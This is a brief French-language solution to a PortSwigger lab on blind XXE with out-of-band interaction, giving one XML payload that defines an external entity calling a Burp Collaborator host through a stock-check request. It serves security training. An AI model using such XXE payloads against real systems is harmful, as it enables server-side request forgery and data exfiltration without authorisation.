# Lab

https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

## Solution

On peut utiliser le même payload que pour les SSRF via XXE :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://h1jnu19gtdo25g3gtrpey32fn6txhn5c.oastify.com/"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```